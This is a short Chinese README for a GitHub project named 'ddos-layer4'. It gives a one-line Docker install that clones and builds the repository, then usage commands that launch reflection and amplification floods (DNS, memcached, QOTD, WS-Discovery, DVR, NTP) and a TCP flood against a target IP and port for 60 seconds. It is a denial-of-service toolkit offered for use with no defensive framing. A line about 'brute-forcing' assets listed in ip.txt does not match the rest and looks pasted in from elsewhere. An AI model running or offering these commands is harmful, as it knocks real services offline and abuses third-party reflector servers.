### 安装 （docker）
apt update -y && apt install docker.io -y && apt install git -y && git clone https://github.com/qq1521575701/ddos-layer4.git && cd ddos-layer4 && docker build -t ddos-layer4 . && docker run -itd --name ddos-layer4 --network host ddos-layer4:latest && docker exec -it ddos /bin/bash

	先把要爆破的资产放入ip.txt中，直接运行下面命令开始爆破。 结果会在当前目录生成res.txt

### 使用
docker exec -it ddos-layer4 ./dns ip port dns.txt 1 -1 60 &

docker exec -it ddos-layer4 ./meme ip port meme.txt 1 -1 60 &

docker exec -it ddos-layer4 ./qotd ip port qotd.txt 1 -1 60 &

docker exec -it ddos-layer4 ./wsd ip port wsd.txt 1 -1 60 &

docker exec -it ddos-layer4 ./dvr ip port dvr.txt 1 -1 60 &

docker exec -it ddos-layer4 ./ntp ip port ntp.txt 1 -1 60 &

docker exec -it ddos-layer4 ./tcp ip port 1 -1 60 &
